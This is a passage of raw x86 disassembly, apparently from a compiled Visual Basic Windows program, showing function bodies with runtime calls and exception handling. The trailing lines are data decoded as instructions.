  404f7e:	ff 15 ec 10 40 00    	call   *0x4010ec
  404f84:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  404f87:	ff 15 3c 11 40 00    	call   *0x40113c
  404f8d:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  404f94:	8b 55 08             	mov    0x8(%ebp),%edx
  404f97:	83 c2 40             	add    $0x40,%edx
  404f9a:	89 95 74 ff ff ff    	mov    %edx,-0x8c(%ebp)
  404fa0:	c7 85 6c ff ff ff 08 	movl   $0x4008,-0x94(%ebp)
  404fa7:	40 00 00 
  404faa:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  404fb0:	50                   	push   %eax
  404fb1:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  404fb4:	51                   	push   %ecx
  404fb5:	ff 15 30 10 40 00    	call   *0x401030
  404fbb:	8b 55 08             	mov    0x8(%ebp),%edx
  404fbe:	83 c2 3c             	add    $0x3c,%edx
  404fc1:	89 95 64 ff ff ff    	mov    %edx,-0x9c(%ebp)
  404fc7:	c7 85 5c ff ff ff 08 	movl   $0x4008,-0xa4(%ebp)
  404fce:	40 00 00 
  404fd1:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  404fd7:	50                   	push   %eax
  404fd8:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  404fdb:	51                   	push   %ecx
  404fdc:	ff 15 30 10 40 00    	call   *0x401030
  404fe2:	8d 55 9c             	lea    -0x64(%ebp),%edx
  404fe5:	52                   	push   %edx
  404fe6:	8d 45 8c             	lea    -0x74(%ebp),%eax
  404fe9:	50                   	push   %eax
  404fea:	ff 15 08 11 40 00    	call   *0x401108
  404ff0:	66 89 85 54 ff ff ff 	mov    %ax,-0xac(%ebp)
  404ff7:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  404ffa:	51                   	push   %ecx
  404ffb:	8d 55 9c             	lea    -0x64(%ebp),%edx
  404ffe:	52                   	push   %edx
  404fff:	6a 02                	push   $0x2
  405001:	ff 15 1c 10 40 00    	call   *0x40101c
  405007:	83 c4 0c             	add    $0xc,%esp
  40500a:	0f bf 85 54 ff ff ff 	movswl -0xac(%ebp),%eax
  405011:	85 c0                	test   %eax,%eax
  405013:	74 46                	je     0x40505b
  405015:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  40501c:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40501f:	51                   	push   %ecx
  405020:	8b 55 08             	mov    0x8(%ebp),%edx
  405023:	8b 02                	mov    (%edx),%eax
  405025:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405028:	51                   	push   %ecx
  405029:	ff 90 fc 06 00 00    	call   *0x6fc(%eax)
  40502f:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  405032:	ff 15 10 10 40 00    	call   *0x401010
  405038:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  40503f:	8d 55 9c             	lea    -0x64(%ebp),%edx
  405042:	52                   	push   %edx
  405043:	8b 45 08             	mov    0x8(%ebp),%eax
  405046:	8b 08                	mov    (%eax),%ecx
  405048:	8b 55 08             	mov    0x8(%ebp),%edx
  40504b:	52                   	push   %edx
  40504c:	ff 91 00 07 00 00    	call   *0x700(%ecx)
  405052:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  405055:	ff 15 10 10 40 00    	call   *0x401010
  40505b:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  405062:	e9 ef fa ff ff       	jmp    0x404b56
  405067:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  40506e:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405071:	50                   	push   %eax
  405072:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  405078:	51                   	push   %ecx
  405079:	68 bc 2d 40 00       	push   $0x402dbc
  40507e:	ff 15 70 10 40 00    	call   *0x401070
  405084:	89 85 10 ff ff ff    	mov    %eax,-0xf0(%ebp)
  40508a:	83 bd 10 ff ff ff 00 	cmpl   $0x0,-0xf0(%ebp)
  405091:	0f 85 ba f8 ff ff    	jne    0x404951
  405097:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
  40509e:	8b 55 08             	mov    0x8(%ebp),%edx
  4050a1:	66 8b 42 50          	mov    0x50(%edx),%ax
  4050a5:	66 05 01 00          	add    $0x1,%ax
  4050a9:	0f 80 cd 00 00 00    	jo     0x40517c
  4050af:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4050b2:	66 89 41 50          	mov    %ax,0x50(%ecx)
  4050b6:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  4050bd:	8b 55 08             	mov    0x8(%ebp),%edx
  4050c0:	8b 02                	mov    (%edx),%eax
  4050c2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4050c5:	51                   	push   %ecx
  4050c6:	ff 90 14 07 00 00    	call   *0x714(%eax)
  4050cc:	68 67 51 40 00       	push   $0x405167
  4050d1:	eb 4d                	jmp    0x405120
  4050d3:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  4050d6:	52                   	push   %edx
  4050d7:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4050da:	50                   	push   %eax
  4050db:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4050de:	51                   	push   %ecx
  4050df:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4050e2:	52                   	push   %edx
  4050e3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4050e6:	50                   	push   %eax
  4050e7:	6a 05                	push   $0x5
  4050e9:	ff 15 f0 10 40 00    	call   *0x4010f0
  4050ef:	83 c4 18             	add    $0x18,%esp
  4050f2:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4050f5:	51                   	push   %ecx
  4050f6:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4050f9:	52                   	push   %edx
  4050fa:	6a 02                	push   $0x2
  4050fc:	ff 15 28 10 40 00    	call   *0x401028
  405102:	83 c4 0c             	add    $0xc,%esp
  405105:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40510b:	50                   	push   %eax
  40510c:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40510f:	51                   	push   %ecx
  405110:	8d 55 9c             	lea    -0x64(%ebp),%edx
  405113:	52                   	push   %edx
  405114:	6a 03                	push   $0x3
  405116:	ff 15 1c 10 40 00    	call   *0x40101c
  40511c:	83 c4 10             	add    $0x10,%esp
  40511f:	c3                   	ret
  405120:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  405126:	50                   	push   %eax
  405127:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  40512d:	51                   	push   %ecx
  40512e:	6a 02                	push   $0x2
  405130:	ff 15 28 10 40 00    	call   *0x401028
  405136:	83 c4 0c             	add    $0xc,%esp
  405139:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40513c:	ff 15 3c 11 40 00    	call   *0x40113c
  405142:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405145:	ff 15 3c 11 40 00    	call   *0x40113c
  40514b:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40514e:	ff 15 40 11 40 00    	call   *0x401140
  405154:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405157:	ff 15 40 11 40 00    	call   *0x401140
  40515d:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405160:	ff 15 40 11 40 00    	call   *0x401140
  405166:	c3                   	ret
  405167:	33 c0                	xor    %eax,%eax
  405169:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40516c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405173:	5f                   	pop    %edi
  405174:	5e                   	pop    %esi
  405175:	5b                   	pop    %ebx
  405176:	8b e5                	mov    %ebp,%esp
  405178:	5d                   	pop    %ebp
  405179:	c2 08 00             	ret    $0x8
  40517c:	ff 15 d0 10 40 00    	call   *0x4010d0
  405182:	cc                   	int3
  405183:	cc                   	int3
  405184:	cc                   	int3
  405185:	cc                   	int3
  405186:	cc                   	int3
  405187:	cc                   	int3
  405188:	cc                   	int3
  405189:	cc                   	int3
  40518a:	cc                   	int3
  40518b:	cc                   	int3
  40518c:	cc                   	int3
  40518d:	cc                   	int3
  40518e:	cc                   	int3
  40518f:	cc                   	int3
  405190:	55                   	push   %ebp
  405191:	8b ec                	mov    %esp,%ebp
  405193:	83 ec 08             	sub    $0x8,%esp
  405196:	68 f6 12 40 00       	push   $0x4012f6
  40519b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4051a1:	50                   	push   %eax
  4051a2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4051a9:	81 ec a8 00 00 00    	sub    $0xa8,%esp
  4051af:	53                   	push   %ebx
  4051b0:	56                   	push   %esi
  4051b1:	57                   	push   %edi
  4051b2:	89 65 f8             	mov    %esp,-0x8(%ebp)
  4051b5:	c7 45 fc d8 12 40 00 	movl   $0x4012d8,-0x4(%ebp)
  4051bc:	33 c0                	xor    %eax,%eax
  4051be:	ba 88 2e 40 00       	mov    $0x402e88,%edx
  4051c3:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4051c6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4051c9:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4051cc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4051cf:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4051d2:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4051d5:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4051d8:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4051db:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4051de:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4051e1:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4051e4:	89 45 90             	mov    %eax,-0x70(%ebp)
  4051e7:	89 45 80             	mov    %eax,-0x80(%ebp)
  4051ea:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  4051f0:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  4051f6:	ff 15 ec 10 40 00    	call   *0x4010ec
  4051fc:	8b 75 08             	mov    0x8(%ebp),%esi
  4051ff:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  405202:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405205:	51                   	push   %ecx
  405206:	66 8b 46 50          	mov    0x50(%esi),%ax
  40520a:	52                   	push   %edx
  40520b:	66 89 45 88          	mov    %ax,-0x78(%ebp)
  40520f:	c7 45 80 02 80 00 00 	movl   $0x8002,-0x80(%ebp)
  405216:	ff 15 68 10 40 00    	call   *0x401068
  40521c:	66 85 c0             	test   %ax,%ax
  40521f:	0f 84 29 03 00 00    	je     0x40554e
  405225:	0f bf 4e 50          	movswl 0x50(%esi),%ecx
  405229:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40522c:	8d 55 80             	lea    -0x80(%ebp),%edx
  40522f:	89 45 88             	mov    %eax,-0x78(%ebp)
  405232:	51                   	push   %ecx
  405233:	8d 45 b0             	lea    -0x50(%ebp),%eax
  405236:	52                   	push   %edx
  405237:	50                   	push   %eax
  405238:	c7 45 80 08 40 00 00 	movl   $0x4008,-0x80(%ebp)
  40523f:	ff 15 18 11 40 00    	call   *0x401118
  405245:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405248:	6a 01                	push   $0x1
  40524a:	8d 55 a0             	lea    -0x60(%ebp),%edx
  40524d:	51                   	push   %ecx
  40524e:	52                   	push   %edx
  40524f:	ff 15 28 11 40 00    	call   *0x401128
  405255:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405258:	8d 7e 4c             	lea    0x4c(%esi),%edi
  40525b:	50                   	push   %eax
  40525c:	ff 15 18 10 40 00    	call   *0x401018
  405262:	8b 1d 20 11 40 00    	mov    0x401120,%ebx
  405268:	8b d0                	mov    %eax,%edx
  40526a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40526d:	ff d3                	call   *%ebx
  40526f:	8b d0                	mov    %eax,%edx
  405271:	8b cf                	mov    %edi,%ecx
  405273:	ff 15 ec 10 40 00    	call   *0x4010ec
  405279:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40527c:	ff 15 3c 11 40 00    	call   *0x40113c
  405282:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  405285:	8d 55 b0             	lea    -0x50(%ebp),%edx
  405288:	51                   	push   %ecx
  405289:	52                   	push   %edx
  40528a:	6a 02                	push   $0x2
  40528c:	ff 15 1c 10 40 00    	call   *0x40101c
  405292:	8b 07                	mov    (%edi),%eax
  405294:	8b 16                	mov    (%esi),%edx
  405296:	83 c4 0c             	add    $0xc,%esp
  405299:	89 95 4c ff ff ff    	mov    %edx,-0xb4(%ebp)
  40529f:	50                   	push   %eax
  4052a0:	68 08 2c 40 00       	push   $0x402c08
  4052a5:	ff 15 34 10 40 00    	call   *0x401034
  4052ab:	8b d0                	mov    %eax,%edx
  4052ad:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4052b0:	ff d3                	call   *%ebx
  4052b2:	8b 8d 4c ff ff ff    	mov    -0xb4(%ebp),%ecx
  4052b8:	50                   	push   %eax
  4052b9:	56                   	push   %esi
  4052ba:	ff 91 10 07 00 00    	call   *0x710(%ecx)
  4052c0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4052c3:	ff 15 3c 11 40 00    	call   *0x40113c
  4052c9:	8b 16                	mov    (%esi),%edx
  4052cb:	56                   	push   %esi
  4052cc:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  4052d2:	50                   	push   %eax
  4052d3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4052d6:	50                   	push   %eax
  4052d7:	ff 15 54 10 40 00    	call   *0x401054
  4052dd:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  4052e0:	8b 38                	mov    (%eax),%edi
  4052e2:	51                   	push   %ecx
  4052e3:	68 08 2c 40 00       	push   $0x402c08
  4052e8:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  4052ee:	ff 15 34 10 40 00    	call   *0x401034
  4052f4:	8b d0                	mov    %eax,%edx
  4052f6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4052f9:	ff d3                	call   *%ebx
  4052fb:	8b d7                	mov    %edi,%edx
  4052fd:	8b bd 68 ff ff ff    	mov    -0x98(%ebp),%edi
  405303:	50                   	push   %eax
  405304:	57                   	push   %edi
  405305:	ff 92 ac 00 00 00    	call   *0xac(%edx)
  40530b:	85 c0                	test   %eax,%eax
  40530d:	db e2                	fnclex
  40530f:	7d 12                	jge    0x405323
  405311:	68 ac 00 00 00       	push   $0xac
  405316:	68 c8 2e 40 00       	push   $0x402ec8
  40531b:	57                   	push   %edi
  40531c:	50                   	push   %eax
  40531d:	ff 15 38 10 40 00    	call   *0x401038
  405323:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405326:	ff 15 3c 11 40 00    	call   *0x40113c
  40532c:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40532f:	ff 15 40 11 40 00    	call   *0x401140
  405335:	8b 06                	mov    (%esi),%eax
  405337:	56                   	push   %esi
  405338:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  40533e:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  405341:	50                   	push   %eax
  405342:	51                   	push   %ecx
  405343:	ff 15 54 10 40 00    	call   *0x401054
  405349:	8b f8                	mov    %eax,%edi
  40534b:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  405351:	50                   	push   %eax
  405352:	57                   	push   %edi
  405353:	8b 17                	mov    (%edi),%edx
  405355:	ff 92 e8 00 00 00    	call   *0xe8(%edx)
  40535b:	85 c0                	test   %eax,%eax
  40535d:	db e2                	fnclex
  40535f:	7d 12                	jge    0x405373
  405361:	68 e8 00 00 00       	push   $0xe8
  405366:	68 c8 2e 40 00       	push   $0x402ec8
  40536b:	57                   	push   %edi
  40536c:	50                   	push   %eax
  40536d:	ff 15 38 10 40 00    	call   *0x401038
  405373:	8b 8d 6c ff ff ff    	mov    -0x94(%ebp),%ecx
  405379:	c7 85 58 ff ff ff 01 	movl   $0x1,-0xa8(%ebp)
  405380:	00 00 00 
  405383:	89 8d 54 ff ff ff    	mov    %ecx,-0xac(%ebp)
  405389:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40538c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  405393:	ff 15 40 11 40 00    	call   *0x401140
  405399:	66 8b 95 54 ff ff ff 	mov    -0xac(%ebp),%dx
  4053a0:	66 39 55 ec          	cmp    %dx,-0x14(%ebp)
  4053a4:	0f 8f a4 01 00 00    	jg     0x40554e
  4053aa:	8b 06                	mov    (%esi),%eax
  4053ac:	56                   	push   %esi
  4053ad:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  4053b3:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4053b6:	50                   	push   %eax
  4053b7:	51                   	push   %ecx
  4053b8:	ff 15 54 10 40 00    	call   *0x401054
  4053be:	8b f8                	mov    %eax,%edi
  4053c0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4053c3:	50                   	push   %eax
  4053c4:	57                   	push   %edi
  4053c5:	8b 17                	mov    (%edi),%edx
  4053c7:	ff 92 a8 00 00 00    	call   *0xa8(%edx)
  4053cd:	85 c0                	test   %eax,%eax
  4053cf:	db e2                	fnclex
  4053d1:	7d 12                	jge    0x4053e5
  4053d3:	68 a8 00 00 00       	push   $0xa8
  4053d8:	68 c8 2e 40 00       	push   $0x402ec8
  4053dd:	57                   	push   %edi
  4053de:	50                   	push   %eax
  4053df:	ff 15 38 10 40 00    	call   *0x401038
  4053e5:	8b 0e                	mov    (%esi),%ecx
  4053e7:	56                   	push   %esi
  4053e8:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  4053ee:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4053f1:	50                   	push   %eax
  4053f2:	52                   	push   %edx
  4053f3:	ff 15 54 10 40 00    	call   *0x401054
  4053f9:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4053fc:	8b f8                	mov    %eax,%edi
  4053fe:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405401:	8b 07                	mov    (%edi),%eax
  405403:	51                   	push   %ecx
  405404:	52                   	push   %edx
  405405:	57                   	push   %edi
  405406:	ff 90 f8 00 00 00    	call   *0xf8(%eax)
  40540c:	85 c0                	test   %eax,%eax
  40540e:	db e2                	fnclex
  405410:	7d 12                	jge    0x405424
  405412:	68 f8 00 00 00       	push   $0xf8
  405417:	68 c8 2e 40 00       	push   $0x402ec8
  40541c:	57                   	push   %edi
  40541d:	50                   	push   %eax
  40541e:	ff 15 38 10 40 00    	call   *0x401038
  405424:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405427:	8d 7e 40             	lea    0x40(%esi),%edi
  40542a:	50                   	push   %eax
  40542b:	68 00 2d 40 00       	push   $0x402d00
  405430:	ff 15 34 10 40 00    	call   *0x401034
  405436:	8b d0                	mov    %eax,%edx
  405438:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40543b:	ff d3                	call   *%ebx
  40543d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405440:	50                   	push   %eax
  405441:	51                   	push   %ecx
  405442:	ff 15 34 10 40 00    	call   *0x401034
  405448:	8b d0                	mov    %eax,%edx
  40544a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40544d:	ff d3                	call   *%ebx
  40544f:	8b d0                	mov    %eax,%edx
  405451:	8b cf                	mov    %edi,%ecx
  405453:	ff 15 ec 10 40 00    	call   *0x4010ec
  405459:	8d 55 c8             	lea    -0x38(%ebp),%edx
  40545c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40545f:	52                   	push   %edx
  405460:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405463:	50                   	push   %eax
  405464:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405467:	51                   	push   %ecx
  405468:	52                   	push   %edx
  405469:	6a 04                	push   $0x4
  40546b:	ff 15 f0 10 40 00    	call   *0x4010f0
  405471:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405474:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  405477:	50                   	push   %eax
  405478:	51                   	push   %ecx
  405479:	6a 02                	push   $0x2
  40547b:	ff 15 28 10 40 00    	call   *0x401028
  405481:	8b 17                	mov    (%edi),%edx
  405483:	83 c4 20             	add    $0x20,%esp
  405486:	52                   	push   %edx
  405487:	68 dc 2e 40 00       	push   $0x402edc
  40548c:	ff 15 34 10 40 00    	call   *0x401034
  405492:	8b d0                	mov    %eax,%edx
  405494:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405497:	ff d3                	call   *%ebx
  405499:	8b d0                	mov    %eax,%edx
  40549b:	8d 4e 44             	lea    0x44(%esi),%ecx
  40549e:	ff 15 ec 10 40 00    	call   *0x4010ec
  4054a4:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4054a7:	ff 15 3c 11 40 00    	call   *0x40113c
  4054ad:	8d 45 80             	lea    -0x80(%ebp),%eax
  4054b0:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4054b3:	89 7d 88             	mov    %edi,-0x78(%ebp)
  4054b6:	8b 3d 30 10 40 00    	mov    0x401030,%edi
  4054bc:	50                   	push   %eax
  4054bd:	51                   	push   %ecx
  4054be:	c7 45 80 08 40 00 00 	movl   $0x4008,-0x80(%ebp)
  4054c5:	ff d7                	call   *%edi
  4054c7:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  4054cd:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4054d0:	8d 56 3c             	lea    0x3c(%esi),%edx
  4054d3:	50                   	push   %eax
  4054d4:	51                   	push   %ecx
  4054d5:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  4054db:	c7 85 70 ff ff ff 08 	movl   $0x4008,-0x90(%ebp)
  4054e2:	40 00 00 
  4054e5:	ff d7                	call   *%edi
  4054e7:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4054ea:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4054ed:	52                   	push   %edx
  4054ee:	50                   	push   %eax
  4054ef:	ff 15 08 11 40 00    	call   *0x401108
  4054f5:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4054f8:	8d 55 b0             	lea    -0x50(%ebp),%edx
  4054fb:	51                   	push   %ecx
  4054fc:	52                   	push   %edx
  4054fd:	6a 02                	push   $0x2
  4054ff:	8b f8                	mov    %eax,%edi
  405501:	ff 15 1c 10 40 00    	call   *0x40101c
  405507:	83 c4 0c             	add    $0xc,%esp
  40550a:	66 85 ff             	test   %di,%di
  40550d:	74 2a                	je     0x405539
  40550f:	8b 06                	mov    (%esi),%eax
  405511:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405514:	51                   	push   %ecx
  405515:	56                   	push   %esi
  405516:	ff 90 fc 06 00 00    	call   *0x6fc(%eax)
  40551c:	8b 3d 10 10 40 00    	mov    0x401010,%edi
  405522:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405525:	ff d7                	call   *%edi
  405527:	8b 16                	mov    (%esi),%edx
  405529:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40552c:	50                   	push   %eax
  40552d:	56                   	push   %esi
  40552e:	ff 92 00 07 00 00    	call   *0x700(%edx)
  405534:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405537:	ff d7                	call   *%edi
  405539:	66 8b 8d 58 ff ff ff 	mov    -0xa8(%ebp),%cx
  405540:	66 03 4d ec          	add    -0x14(%ebp),%cx
  405544:	70 77                	jo     0x4055bd
  405546:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  405549:	e9 4b fe ff ff       	jmp    0x405399
  40554e:	68 a8 55 40 00       	push   $0x4055a8
  405553:	eb 40                	jmp    0x405595
  405555:	8d 55 c8             	lea    -0x38(%ebp),%edx
  405558:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40555b:	52                   	push   %edx
  40555c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40555f:	50                   	push   %eax
  405560:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405563:	51                   	push   %ecx
  405564:	52                   	push   %edx
  405565:	6a 04                	push   $0x4
  405567:	ff 15 f0 10 40 00    	call   *0x4010f0
  40556d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405570:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  405573:	50                   	push   %eax
  405574:	51                   	push   %ecx
  405575:	6a 02                	push   $0x2
  405577:	ff 15 28 10 40 00    	call   *0x401028
  40557d:	8d 55 90             	lea    -0x70(%ebp),%edx
  405580:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405583:	52                   	push   %edx
  405584:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405587:	50                   	push   %eax
  405588:	51                   	push   %ecx
  405589:	6a 03                	push   $0x3
  40558b:	ff 15 1c 10 40 00    	call   *0x40101c
  405591:	83 c4 30             	add    $0x30,%esp
  405594:	c3                   	ret
  405595:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405598:	ff 15 10 10 40 00    	call   *0x401010
  40559e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4055a1:	ff 15 3c 11 40 00    	call   *0x40113c
  4055a7:	c3                   	ret
  4055a8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4055ab:	5f                   	pop    %edi
  4055ac:	5e                   	pop    %esi
  4055ad:	33 c0                	xor    %eax,%eax
  4055af:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4055b6:	5b                   	pop    %ebx
  4055b7:	8b e5                	mov    %ebp,%esp
  4055b9:	5d                   	pop    %ebp
  4055ba:	c2 04 00             	ret    $0x4
  4055bd:	ff 15 d0 10 40 00    	call   *0x4010d0
  4055c3:	90                   	nop
  4055c4:	90                   	nop
  4055c5:	90                   	nop
  4055c6:	90                   	nop
  4055c7:	90                   	nop
  4055c8:	90                   	nop
  4055c9:	90                   	nop
  4055ca:	90                   	nop
  4055cb:	90                   	nop
  4055cc:	90                   	nop
  4055cd:	90                   	nop
  4055ce:	90                   	nop
  4055cf:	90                   	nop
  4055d0:	9e                   	sahf
  4055d1:	9e                   	sahf
  4055d2:	9e                   	sahf
  4055d3:	9e                   	sahf
  4055d4:	fc                   	cld
  4055d5:	55                   	push   %ebp
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	ff                   	(bad)
  4055d9:	ff                   	(bad)
  4055da:	ff                   	(bad)
  4055db:	ff                   	(bad)
  4055dc:	ff                   	(bad)
  4055dd:	ff                   	(bad)
  4055de:	ff                   	(bad)
  4055df:	ff 44 57 00          	incl   0x0(%edi,%edx,2)
  4055e3:	00 00                	add    %al,(%eax)
  4055e5:	10 00                	adc    %al,(%eax)
	...
  4055fb:	00 52 57             	add    %dl,0x57(%edx)
  4055fe:	00 00                	add    %al,(%eax)
  405600:	5c                   	pop    %esp
  405601:	57                   	push   %edi
  405602:	00 00                	add    %al,(%eax)
  405604:	6a 57                	push   $0x57
  405606:	00 00                	add    %al,(%eax)
  405608:	7a 57                	jp     0x405661
  40560a:	00 00                	add    %al,(%eax)
  40560c:	8a 57 00             	mov    0x0(%edi),%dl
  40560f:	00 9a 57 00 00 aa    	add    %bl,-0x55ffffa9(%edx)
  405615:	57                   	push   %edi
  405616:	00 00                	add    %al,(%eax)
  405618:	bc 57 00 00 d0       	mov    $0xd0000057,%esp
  40561d:	57                   	push   %edi
  40561e:	00 00                	add    %al,(%eax)
  405620:	dc 57 00             	fcoml  0x0(%edi)
  405623:	00 ec                	add    %ch,%ah
  405625:	57                   	push   %edi
  405626:	00 00                	add    %al,(%eax)
  405628:	00 58 00             	add    %bl,0x0(%eax)
  40562b:	00 06                	add    %al,(%esi)
  40562d:	02 00                	add    (%eax),%al
  40562f:	80 0e 58             	orb    $0x58,(%esi)
  405632:	00 00                	add    %al,(%eax)
  405634:	1c 58                	sbb    $0x58,%al
  405636:	00 00                	add    %al,(%eax)
  405638:	34 58                	xor    $0x58,%al
  40563a:	00 00                	add    %al,(%eax)
  40563c:	44                   	inc    %esp
  40563d:	58                   	pop    %eax
  40563e:	00 00                	add    %al,(%eax)
  405640:	58                   	pop    %eax
  405641:	58                   	pop    %eax
  405642:	00 00                	add    %al,(%eax)
  405644:	68 58 00 00 7e       	push   $0x7e000058
  405649:	58                   	pop    %eax
  40564a:	00 00                	add    %al,(%eax)
  40564c:	53                   	push   %ebx
  40564d:	02 00                	add    (%eax),%al
  40564f:	80 8e 58 00 00 9c 58 	orb    $0x58,-0x63ffffa8(%esi)
  405656:	00 00                	add    %al,(%eax)
  405658:	ae                   	scas   %es:(%edi),%al
  405659:	58                   	pop    %eax
  40565a:	00 00                	add    %al,(%eax)
  40565c:	c2 58 00             	ret    $0x58
  40565f:	00 56 02             	add    %dl,0x2(%esi)
  405662:	00 80 d4 58 00 00    	add    %al,0x58d4(%eax)
  405668:	e4 58                	in     $0x58,%al
  40566a:	00 00                	add    %al,(%eax)
  40566c:	ee                   	out    %al,(%dx)
  40566d:	58                   	pop    %eax
  40566e:	00 00                	add    %al,(%eax)
  405670:	06                   	push   %es
  405671:	59                   	pop    %ecx
  405672:	00 00                	add    %al,(%eax)
  405674:	14 59                	adc    $0x59,%al
  405676:	00 00                	add    %al,(%eax)
  405678:	26 59                	es pop %ecx
  40567a:	00 00                	add    %al,(%eax)
  40567c:	11 02                	adc    %eax,(%edx)
